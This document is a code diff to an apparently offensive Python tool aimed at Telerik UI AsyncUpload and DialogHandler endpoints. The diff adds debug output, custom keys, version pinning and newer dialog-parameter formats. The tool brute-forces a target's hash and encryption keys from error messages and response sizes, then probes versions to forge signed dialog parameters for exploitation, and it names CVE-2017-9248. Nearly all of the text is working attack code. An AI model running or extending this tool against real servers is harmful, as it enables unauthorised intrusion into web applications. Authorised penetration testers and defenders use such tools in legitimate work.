@@ -138,34 +138,55 @@ telerik_versions = [
 ]
 
 telerik_versions_patched = [
-    "2022.3.1109",
-    "2022.3.913",
-    "2022.2.622",
-    "2022.2.511",
-    "2022.1.302",
-    "2022.1.119",
-    "2021.3.1111",
-    "2021.3.914",
-    "2021.2.616",
-    "2021.2.511",
-    "2021.1.330",
-    "2021.1.224",
-    "2021.1.119",
-    "2020.3.1021",
-    "2020.3.915",
-    "2020.2.617",
-    "2020.2.512",
-    "2020.1.219",
-    "2020.1.114",
-    "2019.3.1023",
-    "2019.3.917",
-    "2019.2.514",
-    "2019.1.215",
-    "2019.1.115",
-    "2018.3.910",
-    "2018.2.710",
-    "2018.2.516",
     "2018.1.117",
+    "2018.2.516",
+    "2018.2.710",
+    "2018.3.910",
+    "2019.1.115",
+    "2019.1.215",
+    "2019.2.514",
+    "2019.3.917",
+    "2019.3.1023",
+    "2020.1.114",
+    "2020.1.219",
+    "2020.2.512",
+    "2020.2.617",
+    "2020.3.915",
+    "2020.3.1021",
+    "2021.1.119",
+    "2021.1.224",
+    "2021.1.330",
+    "2021.2.511",
+    "2021.2.616",
+    "2021.3.914",
+    "2021.3.1111",
+    "2022.1.119",
+    "2022.1.302",
+    "2022.2.511",
+    "2022.2.622",
+    "2022.3.913",
+    "2022.3.921",
+    "2022.3.1109",
+    "2023.1.117",
+    "2023.1.314",
+    "2023.1.323",
+    "2023.1.425",
+    "2023.2.606",
+    "2023.2.718",
+    "2023.2.829",
+    "2023.3.1010",
+    "2023.3.1114",
+    "2024.1.130",
+    "2024.1.312",
+    "2024.1.319",
+    "2024.2.513",
+    "2024.2.514",
+    "2024.3.806",
+    "2024.3.924",
+    "2024.3.1015",
+    "2024.4.1112",
+    "2024.4.1113",
+    "2024.4.1114",
 ]
 
 
@@ -272,19 +293,46 @@ class AsyncUpload:
     def solve_key(self):
         reported_early_indicator = False
 
-        for telerik_version in chain(telerik_versions, telerik_versions_patched):
-            print(telerik_version)
-            hashkeys = (
-                ["dummyvalue"]
-                if int(telerik_version[:4]) < 2017
-                else self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool)
-            )
+        # If a specific version was provided via command line, only test that version
+        if hasattr(self, "version") and self.version:
+            versions_to_test = [self.version]
+        else:
+            versions_to_test = chain(telerik_versions, telerik_versions_patched)
+
+        for telerik_version in versions_to_test:
+            if hasattr(self, "debug") and self.debug:
+                print(f"\n[DEBUG] Testing Telerik version: {telerik_version}")
+            else:
+                print(telerik_version)
+
+            # If custom keys are provided, use only those
+            if hasattr(self.telerik_hashkey, "custom_keys"):
+                hashkeys = ["dummyvalue"] if int(telerik_version[:4]) < 2017 else [self.telerik_hashkey.custom_keys[1]]
+            else:
+                hashkeys = (
+                    ["dummyvalue"]
+                    if int(telerik_version[:4]) < 2017
+                    else self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool)
+                )
+
             for hashkey in hashkeys:
-                for key in self.telerik_encryptionkey.prepare_keylist(
-                    include_machinekeys=self.include_machinekeys_bool
-                ):
+                # If custom keys are provided, use only those
+                if hasattr(self.telerik_encryptionkey, "custom_keys"):
+                    keys_to_try = [self.telerik_encryptionkey.custom_keys[0]]
+                else:
+                    keys_to_try = self.telerik_encryptionkey.prepare_keylist(
+                        include_machinekeys=self.include_machinekeys_bool
+                    )
+
+                for key in keys_to_try:
                     derive_algos = self.select_derive_algos(telerik_version)
                     for derive_algo in derive_algos:
+                        if hasattr(self, "debug") and self.debug:
+                            print(f"[DEBUG] Testing combination:")
+                            print(f"  - Version: {telerik_version}")
+                            print(f"  - Hash Key: {hashkey}")
+                            print(f"  - Encryption Key: {key}")
+                            print(f"  - Derive Algorithm: {derive_algo}")
                         if derive_algo == "PBKDF1_MS":
                             derived_key, iv = self.telerik_encryptionkey.telerik_derivekeys_PBKDF1_MS(key)
                         elif derive_algo == "PBKDF2":
@@ -299,7 +347,11 @@ class AsyncUpload:
                             f"multipart/form-data; boundary=---------------------------{multipart_boundary}"
                         )
                         request.headers.update(self.headers)
+                        if hasattr(self, "debug") and self.debug:
+                            print(f"[DEBUG] Sending request to: {self.url}")
                         resp = session.send(request, verify=False)
+                        if hasattr(self, "debug") and self.debug:
+                            print(f"[DEBUG] Response status: {resp.status_code}")
                         if "Could not load file or assembly" in resp.text:
                             if reported_early_indicator == False:
                                 print(
@@ -319,7 +371,7 @@ class AsyncUpload:
 
 
 class DialogHandler:
-    def __init__(self, url, include_machinekeys_bool=False, proxies={}, headers=None):
+    def __init__(self, url, modern_dialog_params=False, include_machinekeys_bool=False, proxies={}, headers=None):
         self.url = url
         self.telerik_hashkey = Telerik_HashKey()
         self.telerik_encryptionkey = Telerik_EncryptionKey()
@@ -330,30 +382,82 @@ class DialogHandler:
         self.proxies = proxies
         self.headers = headers
         self.include_machinekeys_bool = include_machinekeys_bool
+        self.modern_dialog_params = modern_dialog_params
 
-    def probe_version(self, version):
-        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+    def probe_version_baseline(self):
+        # Get baseline with bogus version
+        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version=9999.9.999, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
         b64section = base64.b64encode(b64section_plain.encode()).decode()
-        plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
+
+        if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
+        else:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
+
         derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
             self.encryption_key, self.key_derive_mode
         )
         ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
         dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
-        dialog_parameters_data = {"dialogParametersHolder": dialog_parameters}
         r = requests.post(
-            self.url, data=dialog_parameters_data, headers=self.headers, verify=False, proxies=self.proxies
+            self.url,
+            data={"dialogParametersHolder": dialog_parameters},
+            headers=self.headers,
+            verify=False,
+            proxies=self.proxies,
         )
-        if r.status_code != 500:
-            print(version)
-        if r.status_code == 200:
+        return len(r.text)
+
+    def probe_version(self, version, baseline_size=None):
+        if hasattr(self, "debug") and self.debug:
+            print(f"\n[DEBUG] Probing version: {version}")
+
+        b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        b64section = base64.b64encode(b64section_plain.encode()).decode()
+
+        if hasattr(self, "modern_dialog_params") and self.modern_dialog_params:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;StyleManagerProperties,False,0,;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,5000000;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ScriptManagerProperties,False,0,CkZhbHNlCgoKRmFsc2UKMAoKCgo=;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,True"
+        else:
+            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
+
+        derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
+            self.encryption_key, self.key_derive_mode
+        )
+        ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
+        dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(self.hash_key, ct)
+        r = requests.post(
+            self.url,
+            data={"dialogParametersHolder": dialog_parameters},
+            headers=self.headers,
+            verify=False,
+            proxies=self.proxies,
+        )
+
+        # Extract title if it exists
+        title = ""
+        if r.text:
+            title_match = re.search(r"<title>([^<]+)</title>", r.text, re.IGNORECASE)
+            if title_match:
+                title = f" {title_match.group(1).strip()}"
+
+        if hasattr(self, "debug") and self.debug:
+            print(
+                f"Attempting to probe version: {version}. Got response code [{r.status_code}] with size {len(r.text)} {title}"
+            )
+        if baseline_size and abs(len(r.text) - baseline_size) > 10:
             return dialog_parameters
+        return None
 
     def detect_derive_function(self):
         self.key_derive_mode = "PBKDF1_MS"
         KDF_probe_data = {"dialogParametersHolder": "AAAA"}
+        if hasattr(self, "debug") and self.debug:
+            print("\n[DEBUG] Detecting key derivation function")
+            print(f"[DEBUG] Sending probe request to: {self.url}")
         res = requests.post(self.url, data=KDF_probe_data, proxies=self.proxies, headers=self.headers, verify=False)
         resp_body = res.text
+        if hasattr(self, "debug") and self.debug:
+            print(f"[DEBUG] Response status: {res.status_code}")
 
         if (
             "Exception of type 'System.Exception' was thrown" in resp_body
@@ -377,40 +481,64 @@ class DialogHandler:
         print("Target is a valid DialogHandler endpoint. Brute forcing Telerik Hash Key...")
 
     def solve_key(self):
+        print("\n=== KEY DISCOVERY ===")
         # PBKDF1_MS MODE
         if self.key_derive_mode == "PBKDF1_MS":
             hashkey_counter = 0
-            for hash_key_probe, hash_key in self.telerik_hashkey.hashkey_probe_generator(
-                include_machinekeys=self.include_machinekeys_bool
-            ):
+            # If custom keys are provided, use only those
+            if hasattr(self.telerik_hashkey, "custom_keys"):
+                hashkey_generator = [(self.telerik_hashkey.custom_keys[1], self.telerik_hashkey.custom_keys[1])]
+            else:
+                hashkey_generator = self.telerik_hashkey.hashkey_probe_generator(
+                    include_machinekeys=self.include_machinekeys_bool
+                )
+
+            for hash_key_probe, hash_key in hashkey_generator:
                 hashkey_counter += 1
                 data = {"dialogParametersHolder": hash_key_probe}
                 res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+                if hasattr(self, "debug") and self.debug:
+                    print(f"\n[DEBUG] Testing hash key #{hashkey_counter}: {hash_key}")
+                    print(f"[DEBUG] Sending request to: {self.url}")
+
                 resp_body = urllib.parse.unquote(res.text)
+                if hasattr(self, "debug") and self.debug:
+                    print(f"[DEBUG] Response status: {res.status_code}")
 
                 print(f"Tested {hashkey_counter} hash keys so far...") if hashkey_counter % 1000 == 0 else None
 
                 if "The input data is not a complete block" in resp_body:
-                    print(f"Found matching hashkey! [{hash_key}]")
-
+                    print(f"\nSUCCESS! Found matching hashkey: [{hash_key}]")
                     self.hash_key = hash_key
                     break
 
                 elif "The input is not a valid Base-64 string" in resp_body:
-                    print("The target appears to be a pre-2017 version, and does not have a hash key.")
-                    print("This means it should be vulnerable to CVE-2017-9248!!!")
+                    print("\nTarget appears to be a pre-2017 version without hash key (CVE-2017-9248)")
                     return
 
             if self.hash_key:
-                print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")
+                print("\nNow checking for known Telerik Encryption Keys...")
 
                 encryptionkey_counter = 0
-                for encryption_key_probe, encryption_key in self.telerik_encryptionkey.encryptionkey_probe_generator(
-                    hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
-                ):
+                # If custom keys are provided, use only those
+                if hasattr(self.telerik_encryptionkey, "custom_keys"):
+                    encryptionkey_generator = [
+                        (self.telerik_encryptionkey.custom_keys[0], self.telerik_encryptionkey.custom_keys[0])
+                    ]
+                else:
+                    encryptionkey_generator = self.telerik_encryptionkey.encryptionkey_probe_generator(
+                        hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
+                    )
+
+                for encryption_key_probe, encryption_key in encryptionkey_generator:
                     encryptionkey_counter += 1
                     data = {"dialogParametersHolder": encryption_key_probe}
+                    if hasattr(self, "debug") and self.debug:
+                        print(f"\n[DEBUG] Testing encryption key #{encryptionkey_counter}: {encryption_key}")
+                        print(f"[DEBUG] Sending request to: {self.url}")
                     res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+                    if hasattr(self, "debug") and self.debug:
+                        print(f"[DEBUG] Response status: {res.status_code}")
 
                     (
                         print(f"Tested {encryptionkey_counter} encryption keys so far...")
@@ -419,74 +547,139 @@ class DialogHandler:
                     )
 
                     if "Index was outside the bounds of the array" in res.text:
-                        print(f"Found Encryption key! [{encryption_key}]")
+                        print(f"\nSUCCESS! Found encryption key: [{encryption_key}]")
                         self.encryption_key = encryption_key
                         break
 
                 if self.encryption_key == None:
-                    print("Could not identify encryption key.")
+                    print("\nFAILED: Could not identify encryption key.")
                     return
             else:
-                print("Could not identify hash key.")
+                print("\nFAILED: Could not identify hash key.")
                 return
 
         elif self.key_derive_mode == "PBKDF2":
             if self.include_machinekeys_bool:
                 print(
-                    "Warning: MachineKeys inclusion mode is enabled, which affects this Telerik version particularly dramatically. Brute Forcing will be VERY SLOW"
+                    "\nWARNING: MachineKeys inclusion mode is enabled, which affects this Telerik version particularly dramatically. Brute Forcing will be VERY SLOW"
                 )
                 print("Try without the MachineKeys first!")
-            print("About to bruteforce hash key and encryption key combinations...")
+            print("\nBrute forcing hash key and encryption key combinations...")
+
+            # Get baseline response first
+            plaintext = "EnableAsyncUpload,False,3,True;AllowMultipleSelection,False,3,False"
+            derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys("dummy", self.key_derive_mode)
+            ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
+            dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params("dummy", ct)
+            data = {"dialogParametersHolder": dialog_parameters}
+            baseline_res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+            baseline_size = len(baseline_res.text)
+            baseline_status = baseline_res.status_code
+
+            if hasattr(self, "debug") and self.debug:
+                print(f"\n[DEBUG] Baseline response size: {baseline_size} bytes")
+                print(f"[DEBUG] Baseline status code: {baseline_status}")
+
             count = 0
-            for hash_key in self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool):
-                for encryption_key_probe, encryption_key in self.telerik_encryptionkey.encryptionkey_probe_generator(
-                    hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
-                ):
-                    count += 1
-                    data = {"dialogParametersHolder": encryption_key_probe}
-                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
-                    if "Index was outside the bounds of the array" in res.text:
 
-                        print(f"Found Encryption key! [{encryption_key}]")
-                        print(f"Found matching hashkey! [{hash_key}]")
+            # If custom keys are provided, use only those
+            if hasattr(self.telerik_hashkey, "custom_keys"):
+                hashkeys = [self.telerik_hashkey.custom_keys[1]]
+            else:
+                hashkeys = self.telerik_hashkey.prepare_keylist(include_machinekeys=self.include_machinekeys_bool)
 
-                        self.encryption_key = encryption_key
-                        self.hash_key = hash_key
-                        break
-
-                    (
-                        print(f"Tested {count} hash key / encryption key combinations so far...")
-                        if count % 1000 == 0
-                        else None
+            for hash_key in hashkeys:
+                # If custom keys are provided, use only those
+                if hasattr(self.telerik_encryptionkey, "custom_keys"):
+                    encryptionkey_generator = [
+                        (self.telerik_encryptionkey.custom_keys[0], self.telerik_encryptionkey.custom_keys[0])
+                    ]
+                else:
+                    encryptionkey_generator = self.telerik_encryptionkey.encryptionkey_probe_generator(
+                        hash_key, self.key_derive_mode, include_machinekeys=self.include_machinekeys_bool
                     )
 
-                if self.hash_key:
-                    break
+                for encryption_key_probe, encryption_key in encryptionkey_generator:
+                    count += 1
+                    # For PBKDF2, we need to properly encrypt and hash the parameters
+                    derivedKey, derivedIV = self.telerik_encryptionkey.telerik_derivekeys(
+                        encryption_key, self.key_derive_mode
+                    )
+
+                    # Use a simple dummy payload for key discovery
+                    plaintext = "EnableAsyncUpload,False,3,True;AllowMultipleSelection,False,3,False"
+
+                    ct = self.telerik_encryptionkey.telerik_encrypt(derivedKey, derivedIV, plaintext)
+                    dialog_parameters = self.telerik_hashkey.sign_enc_dialog_params(hash_key, ct)
+                    data = {"dialogParametersHolder": dialog_parameters}
+                    if hasattr(self, "debug") and self.debug:
+                        print(f"\n[DEBUG] Testing combination #{count}:")
+                        print(f"  - Hash Key: {hash_key}")
+                        print(f"  - Encryption Key: {encryption_key}")
+                        print(f"[DEBUG] Sending request to: {self.url}")
+                    res = requests.post(self.url, data=data, proxies=self.proxies, headers=self.headers, verify=False)
+
+                    # Extract title if it exists
+                    title = ""
+                    if res.text:
+                        title_match = re.search(r"<title>([^<]+)</title>", res.text, re.IGNORECASE)
+                        if title_match:
+                            title = f" {title_match.group(1).strip()}"
+
+                    response_size = len(res.text)
+                    size_diff = abs(response_size - baseline_size)
+
+                    if hasattr(self, "debug") and self.debug:
+                        print(f"[DEBUG] Response: [{res.status_code}]{title}")
+                        print(f"[DEBUG] Response size: {response_size} bytes (diff: {size_diff} bytes)")
+
+                    # Detect significant change from baseline (more than 10 bytes different)
+                    if size_diff > 10:
+                        print(f"\nSUCCESS! Found encryption key: [{encryption_key}]")
+                        print(f"SUCCESS! Found matching hashkey: [{hash_key}]")
+                        self.encryption_key = encryption_key
+                        self.hash_key = hash_key
+                        return True
+
+                    (print(f"Tested {count} combinations so far...") if count % 1000 == 0 else None)
 
         if self.hash_key and self.encryption_key:
+            print("\nSuccessfully found both keys!")
             return True
         else:
-            print("Did not find hashkey / encryption key. Exiting.")
+            print("\nFAILED: Did not find hashkey / encryption key. Exiting.")
+            return False
 
     def solve_version(self):
-        print(
-            "Both encryption key and hash key were found: attempting to brute-force Telerik UI version and generate exploitation payload"
-        )
+        print("\n=== VERSION PROBING ===")
+        print("Keys found! Now attempting to find the exact Telerik UI version...")
+
+        baseline_size = self.probe_version_baseline()
 
         versions = []
-        for v in telerik_versions + telerik_versions_patched:
-            versions.append(v)
-        undotted_versions = []
-        for v in telerik_versions:
-            undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
-        versions += undotted_versions
+        # If version specified, only test that version
+        if hasattr(self, "version") and self.version:
+            versions = [self.version]
+        else:
+            # Otherwise test all versions
+            for v in telerik_versions + telerik_versions_patched:
+                versions.append(v)
+            undotted_versions = []
+            for v in telerik_versions:
+                undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
+            versions += undotted_versions
 
         for version in versions:
-            dialog_parameters = self.probe_version(version)
+            dialog_parameters = self.probe_version(version, baseline_size)
             if dialog_parameters:
                 self.version = version
                 self.dialog_parameters = dialog_parameters
+                print(f"\nSUCCESS! Found working version: {version}")
                 return True
+
+        print("\nFAILED: Could not find a working version despite having valid keys.")
+        print("This might indicate the target is using a custom/unknown version.")
+        return False
 
 
 def main():
@@ -521,19 +714,50 @@ def main():
         help="Force enumeration of vulnerable AsyncUpload endpoint without user confirmation",
         action="store_true",
     )
+
+    parser.add_argument(
+        "-v",
+        "--version",
+        help="Specify a custom Telerik version to test",
+    )
+
+    parser.add_argument(
+        "-c",
+        "--custom-keys",
+        help="Specify custom keys in format 'encryptionkey,hashkey'. When provided, only these keys will be tested.",
+    )
+
+    parser.add_argument(
+        "-d", "--debug", help="Enable debug mode to show detailed request information", action="store_true"
+    )
+
+    parser.add_argument(
+        "--modern-dialog-params",
+        help="Use modern dialog parameters format (for newer Telerik versions 2018+)",
+        action="store_true",
+    )
+
     args = parser.parse_args()
 
     if not args.url:
         return
+
+    if args.debug:
+        print("\n=== DEBUG MODE ENABLED ===")
+        print("Will show detailed information about each request and key combination being tested")
+        print("This will generate a lot of output!\n")
+
+    if args.proxy:
+        proxies = {"http": args.proxy, "https": args.proxy}
+    else:
+        proxies = {}
 
     include_machinekeys_bool = False
     if args.machine_keys:
         include_machinekeys_bool = True
         print("MachineKeys inclusion enabled. Bruteforcing will take SIGNIFICANTLY longer")
 
-    proxies = None
-    if args.proxy:
-        proxies = {"http": args.proxy, "https": args.proxy}
+        # If version specified, only test that version
 
     headers = {}
     if args.user_agent:
@@ -564,12 +788,26 @@ def main():
                 headers=headers,
                 include_machinekeys_bool=include_machinekeys_bool,
             )
+            if args.custom_keys:
+                try:
+                    encryption_key, hash_key = args.custom_keys.split(",")
+                    rau.telerik_encryptionkey.custom_keys = (encryption_key, hash_key)
+                    rau.telerik_hashkey.custom_keys = (encryption_key, hash_key)
+                    print(f"Using custom keys - Encryption Key: {encryption_key}, Hash Key: {hash_key}")
+                    print("Only testing provided custom keys...")
+                except ValueError:
+                    print("Error: Custom keys must be provided in format 'encryptionkey,hashkey'")
+                    return
             rau.version_probe()
             if not args.force:
                 response = input("Ready to attempt brute-force, press enter to continue...")
                 if response.lower() != "":
                     print("aborting...")
                     sys.exit(2)
+            if args.version:
+                print(f"Testing specified version: {args.version}")
+                rau.version = args.version
+            rau.debug = args.debug
             rau.solve_key()
             return
 
@@ -588,9 +826,28 @@ def main():
             print(f"Confirmed target is Telerik UI DialogHandler")
 
         dh = DialogHandler(
-            args.url, proxies=proxies, headers=headers, include_machinekeys_bool=include_machinekeys_bool
+            args.url,
+            modern_dialog_params=args.modern_dialog_params,
+            proxies=proxies,
+            headers=headers,
+            include_machinekeys_bool=include_machinekeys_bool,
         )
+        if args.custom_keys:
+            try:
+                encryption_key, hash_key = args.custom_keys.split(",")
+                dh.telerik_encryptionkey.custom_keys = (encryption_key, hash_key)
+                dh.telerik_hashkey.custom_keys = (encryption_key, hash_key)
+                print(f"Using custom keys - Encryption Key: {encryption_key}, Hash Key: {hash_key}")
+                print("Only testing provided custom keys...")
+            except ValueError:
+                print("Error: Custom keys must be provided in format 'encryptionkey,hashkey'")
+                return
+        dh.debug = args.debug
+        dh.modern_dialog_params = args.modern_dialog_params
         dh.detect_derive_function()
+        if args.version:
+            print(f"Testing specified version: {args.version}")
+            dh.version = args.version
         if dh.solve_key():
             print("solved key!")
             if dh.solve_version():
